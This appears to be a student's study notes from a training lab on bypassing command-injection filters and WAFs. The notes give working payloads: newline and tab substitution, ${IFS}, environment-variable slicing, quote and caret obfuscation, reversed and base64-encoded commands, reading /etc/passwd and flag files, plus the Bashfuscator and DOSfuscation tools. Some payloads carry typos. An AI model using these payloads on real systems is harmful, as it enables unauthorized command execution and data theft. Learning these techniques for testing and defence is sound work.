## 1- Identifying Filters

Even when developers attempt to secure a web application, poor implementations may still leave it vulnerable. A common mitigation is **blacklisting characters or words** on the backend. Another layer includes **Web Application Firewalls (WAFs)** that detect and block attacks such as command injection, SQLi, and XSS.  
This section explains how these filters behave and how to identify what is being blocked.
#### Filter/WAF Detection
In the updated `Host Checker` application, previously working operators like `;`, `&&`, and `||` now trigger an `invalid input` error.  
Since the error appears inside the application output area, this indicates **backend-side PHP validation** rather than a WAF.  
If the block page contained details like IP or request summary, it would more likely indicate a **WAF block**.

### Blacklisted Characters
A backend filter may check for forbidden characters and deny the request when one appears.  
```php
$blacklist = ['&', '|', ';', ...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### Identifying the Blacklisted Character
To determine what triggers the block, test one character at a time:
- Base payload `127.0.0.1` → works
- Add `;` → `127.0.0.1;` → blocked
 - add `\n`  → **bypass**
This confirms that **the semicolon is blacklisted**.  
We then test other operators to see which additional characters are blocked.


---

## 2- Bypassing Space Filters
Many web applications detect command injection attempts by blocking specific characters or patterns. However, there are multiple ways to bypass these filters, and understanding them helps in both exploiting and securing applications.
#### Bypass Blacklisted Operators
Most common injection operators are blacklisted, but the **newline character (`%0a`)** is usually allowed.  
Sending a payload like `127.0.0.1%0a` is accepted and executes the command, meaning the newline is **not blacklisted** and can be used as an injection operator.
#### Bypass Blacklisted Spaces
```bash
ip=127.0.0.1+whomai #--> blocked
```
After getting a working operator, the next issue is the **space** character, which is also blacklisted.  
Testing shows that adding a space after the newline causes an _invalid input_, meaning spaces are filtered.

To bypass this, we can replace the space with other characters that the shell still interprets as argument separators.

##### Using Tabs
Tabs (`%09`) can act as spaces for command execution.
```bash
# /n+TAB (/n=%0a TAB=%09)
127.0.0.1%0a%09whoami
# /n + TAB + ls + -la
127.0.0.1%0a%09ls%09-l
```
- Result: Request accepted  space filter bypassed.

##### Using $IFS
The Linux environment variable **IFS** contains whitespace (space , tab).  
Using `${IFS}` allows commands to run without using a literal space.
```
ip=127.0.0.1%0a${IFS}whoami
```
- Result: Request accepted , another space bypass.
##### Using Brace Expansion
Bash brace expansion can create commands without spaces.  
Example:
```bash
{ls,-la} # ls -la

# This can be used in payloads such as:
ip=127.0.0.1%0a{ls,-al}
```
##### More Bypasses
More space-bypass techniques exist (encoded characters, wildcards, concatenation, etc.).  
See  the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces..


---
## 3- Bypassing Other Blacklisted Characters (; / \)
Sometimes filters block characters such as `/`, `\`, `;`, or spaces. These characters are required for command injection, so we need creative ways to generate them **without typing them directly**.

 **Key Idea** : Use **environment variable slicing**, **character extraction**, or **character shifting** to generate blocked characters inside the payload.
### Linux (bypass ; / space)

#### Using Environment Variables
Environment variables often contain characters we need. By slicing these variables, we can extract a single character.
>The `printenv`,`env` command prints all environment variables in Linux

Example: extract `/` from `$PATH`:
```bash
# echo $PATH -> /home/kali/ 

 ${PATH:0:1} # /
 
# example (ls /home)
ip=127.0.0.1%0als%09${PATH:0:1}home 
```

**Extracting Other Characters**

You can extract characters from any variable:

- `$HOME`
- `$PWD`
- `$PATH`
- `$LS_COLORS` (contains `;`)
Example: extracting a semicolon:
```bash
# echo $LS_COLORS -> rs=0:di=01;

 ${LS_COLORS:10:1}   -> ;
```

**Using These in Payloads**
To bypass blacklisted `;` and space:
```bash
127.0.0.1${LS_COLORS:10:1}${IFS}

# ${LS_COLORS:10:1} → `;`
# ${IFS} → space
```

summery:
```bash
${LS_COLORS:10:1} → `;`
${IFS} → space/TAB
${PATH:0:1} → /
```
### Windows (bypass ; / space)

#### CMD Character Extraction
Windows environment variables also contain useful characters.
Example: extract `\` from `%HOMEPATH%`:
(`%HOMEPATH%` -> `\Users\htb-student`)  ,  specify a starting position (`~6` -> `\Users`), and finally specifying a negative end position -11 `htb-student`
```cmd
%HOMEPATH:~6,-11% → \
```
#### PowerShell Character Indexing

PowerShell treats strings as arrays, so you can extract characters by index:
```powershell
$env:HOMEPATH[0] -> \
```
You can list environment variables with:
```powershell
Get-ChildItem Env:
```

Then extract any needed character.
### Character Shifting (bypass `\`)

#### Linux Character Shift Trick
You can generate characters by shifting ASCII values.
Example: generate `\` (ASCII 92) by shifting `[` (ASCII 91):
```bash
echo $(tr '!-}' '"-~'<<<[) # --> \
```



> we can try also the **HTTP Verb Tampering** to bypass the filters
---

## 4- Bypassing Blacklisted Commands
When a web application filters **command words** (e.g., `whoami`, `cat`), we can bypass filters using **command obfuscation**—changing how the command looks **without changing how it executes**.

####  Commands Blacklist
Some filters block whole words.  
```php
$blacklist = ['whoami', 'cat', ...];
foreach ($blacklist as $word) {
    if (strpos($_POST['ip'], $word) !== false) {
        echo "Invalid input";
    }
}
```

- The filter catches **exact words**.
- If we make the command “look different”, we bypass the check.
- We combine this with space bypasses (`%0a`, `${IFS}`, etc.).
#### Linux & Windows Obfuscation (Works on both)

 **Quotes Obfuscation**
You can insert quotes inside a command, and the shell still executes it normally:
```bash
w'h'o'am'i
w"h"o"am"i
```
- Cannot mix single & double quotes.
- Total number of quotes must be **even**.
Usage in Payload
```bash
127.0.0.1%0aw'h'o'am'i
#ip=127.0.0.1 cat /home/1nj3c70r/flag.txt
ip=127.0.0.1%0ac'a't%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
#### Linux-Only Obfuscation
**Characters that Bash ignores inside commands:**
- `\` (backslash)
- `$@` (positional parameter expansion)
```bash
who$@ami
w\ho\am\i
```

 You do NOT need an even number of these characters.
> ==If one of these characters is blocked, combine with earlier bypasses (env vars, ASCII shift).==
#### Windows-Only 
**Caret Character (`^`)** Windows CMD ignores `^` inside command names.

```cmd
who^ami
```


---

## 5- Advanced Command Obfuscation

When dealing with strong filtering or WAF protection, basic command injection bypasses may fail. Advanced obfuscation techniques help disguise commands and avoid blacklists.

#### Case Manipulation

Altering the **case** of command characters may bypass word-based filters.
##### Windows 
Commands like `WhOaMi` still execute.
```cmd
 WhOaMi
```
##### Linux  
We must convert our obfuscated casing into lowercase before execution.

Example on linux:
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
Filtered characters like spaces will still break the payload.  
Replacing spaces with tabs (`%09`) allows successful execution.
```bash
ip=127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

Alternative lowercase conversion:
```bash
$(a="WhOaMi";printf %s "${a,,}")
```

#### Reversed Commands
##### linux 
Commands can be written **backwards** to evade keyword filters.
- Reverse the string:
 ```bash
echo 'whoami' | rev   # -> imaohw
# - Execute by reversing at runtime:
$(rev<<<'imaohw')
```
payload 
```bash
ip=127.0.0.1&0a$(rev<<<'imaohw')
```
##### windows
PowerShell equivalent:
```powershell
"whoami"[-1..-20] -join ''        # imaohw
iex "$('imaohw'[-1..-20] -join '')"
```
#### Encoded Commands
Encoding makes commands unrecognizable to filters.
##### Base64  (Linux)
example pass the commnad `cat /etc/passwd | grep 33` 
```bash
# 1. Encode:
echo -n 'cat /etc/passwd | grep 33' | base64
# 2. Decode + execute:
bash<<<$(base64 -d<<<ENCODEDSTRING)

# payload 
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ENCODEDSTRING)
```
- Replace spaces when injecting into filtered applications.
##### Base64  (Windows)

```powershell
# 1. Encode:
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# 2. Decode + execute:
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64DATA')))"
```

---
## 6- Evasion Tools

#### Linux (Bashfuscator)


- **[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator).** is a Linux tool that automatically obfuscates Bash commands.

```bash
./bashfuscator -c 'cat /etc/passwd'

# short payload 
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

-  test the output with `bash -c '<payload>'` to confirm it works.


#### Windows (DOSfuscation)


- **DOSfuscation** is a Windows command obfuscation framework for CMD and PowerShell.

```powershell
 git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
Invoke-DOSfuscation> help

Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```



